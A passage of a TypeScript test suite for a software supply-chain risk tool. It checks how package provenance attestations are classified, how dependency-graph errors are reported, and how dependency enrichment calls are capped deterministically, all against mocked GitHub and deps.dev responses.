    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(observed.observation.provenance[0]?.state).toBe("ERROR");
    const unverified = await new DepsDevProvider({ async boundedJson() { return { attestations: [{ verified: false, sourceRepository: "https://github.com/acme/demo", url: "https://prov.example/1" }] }; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unverified.observation.provenance[0]).toMatchObject({ state: "PRESENT_UNVERIFIED", attestationUrl: "https://prov.example/1" });
    const unavailable = await new DepsDevProvider({ async boundedJson() { return {}; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unavailable.observation.provenance[0]?.state).toBe("UNAVAILABLE");
  });

  test("preserves the host/path separator in canonical repository identity", async () => {
    const expected = { repository: "github.com/acme/demo", commit: commitSha };
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo", commit: commitSha }, expected).state).toBe("VERIFIED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "git+ssh://git@github.com/acme/demo.git", commit: commitSha }, expected)).toMatchObject({ state: "VERIFIED", sourceRepository: "github.com/acme/demo", expectedSourceMatches: true, expectedCommitMatches: true });
    // Cryptographic attestation without a source commit must NOT become VERIFIED
    // against an expected commit: verification and expected-commit matching are
    // separate facts and the match is unknown, so it fails closed explicitly.
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }, expected).state).toBe("VERIFIED_COMMIT_UNCONFIRMED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }, expected).expectedCommitMatches).toBe(false);
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }).state).toBe("VERIFIED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/other/repo", commit: commitSha }, expected).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, expected).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("treats top-level and per-node deps.dev graph errors as unchecked graphs with bounded diagnostics", async () => {
    const coordinate = { ecosystem: "NPM" as const, name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." };
    const maxGraphBytes = 2 * 1024 * 1024;
    const topLevel = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { error: "internal dependency graph error", nodes: [] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(topLevel.observation.graph).toMatchObject({ checked: false, error: "internal dependency graph error" });
    const nodeLevel = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { nodes: [{ errors: ["missing version resolution for left-pad@^1.0.0"] }, {}, { errors: ["second", "third", "fourth", "fifth", "sixth"] }] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(nodeLevel.observation.graph.checked).toBe(false);
    expect(nodeLevel.observation.graph.error).toContain("missing version resolution for left-pad@^1.0.0");
    expect(nodeLevel.observation.graph.error!.split("; ").length).toBeLessThanOrEqual(5);
    const cleanGraph = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { nodes: [{}] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(cleanGraph.observation.graph).toEqual({ checked: true, nodeCount: 1 });
  });

  test("bounds deps.dev enrichment deterministically instead of fanning out to every declared coordinate", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const lock = (entries: Record<string, string>) => JSON.stringify({ packages: Object.fromEntries(Object.entries(entries).map(([name, version]) => [`node_modules/${name}`, { version }])) });
    // 40 distinct exact coordinates across two workspaces — above the enrichment limit.
    const rootEntries = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`pkg-${i}`, `1.0.${i}`]));
    const nestedEntries = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`nested-${i}`, `2.0.${i}`]));
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "app/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "app/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: Object.fromEntries(Object.keys(rootEntries).map(name => [name, "^1.0.0"])) })),
        [`${base}/contents/package-lock.json?ref=${commitSha}`]: content(lock(rootEntries)),
        [`${base}/contents/app%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: Object.fromEntries(Object.keys(nestedEntries).map(name => [name, "^2.0.0"])) })),
        [`${base}/contents/app%2Fpackage-lock.json?ref=${commitSha}`]: content(lock(nestedEntries))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    let enrichmentCalls = 0;
    const seenCoordinates: string[] = [];
    const depsDev = fakeDepsDev(coordinate => {
      enrichmentCalls += 1;
      seenCoordinates.push(`${coordinate.name}@${coordinate.version}`);
    });
    const threatIntel = threatIntelStore(async () => ({ checked: true, findings: [] }));
    const omni = new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, staticScorecard as never, {} as never, {} as never, {} as never, {} as never, threatIntel as never, new NoopAssessmentJournal(), new GitHubRepositoryProvider(http as never) as never, depsDev as never);

    const assessment = await omni.repositoryRisk("acme", "demo");
    const evidence = evidenceOf(assessment);

    expect(enrichmentCalls).toBeLessThanOrEqual(24);
    expect(evidence.coverage.status).toBe("partial");
    expect(evidence.coverage.limitations).toEqual(expect.arrayContaining([expect.stringMatching(/^dependency_enrichment_limit_reached:\d+_of_40_deferred$/)]));
    // Deterministic selection: repeated runs select the same coordinates in the same order.
    const secondSeen: string[] = [];
    const again = fakeDepsDev(coordinate => { secondSeen.push(`${coordinate.name}@${coordinate.version}`); });
    const otherThreatIntel = threatIntelStore(async () => ({ checked: true, findings: [] }));
    const other = new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, staticScorecard as never, {} as never, {} as never, {} as never, {} as never, otherThreatIntel as never, new NoopAssessmentJournal(), new GitHubRepositoryProvider(http as never) as never, again as never);
    const second = await other.repositoryRisk("acme", "demo");
    expect(secondSeen.sort()).toEqual([...seenCoordinates].sort());
    // Observation-only evidence never changes the omni-risk-v1 verdict, and
    // repository threat-intel failures stay outside generic sourceErrors.
    const engine = new RiskEngine();
    const baselineEvidence = [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }];
    const baseline = engine.assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: baselineEvidence });
    expect({ riskScore: assessment.riskScore, recommendation: assessment.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
    expect({ riskScore: second.riskScore, recommendation: second.recommendation }).toEqual({ riskScore: baseline.riskScore, recommendation: baseline.recommendation });
  });
});

const MAX_STREAM_BYTES = 2 * 1024 * 1024;
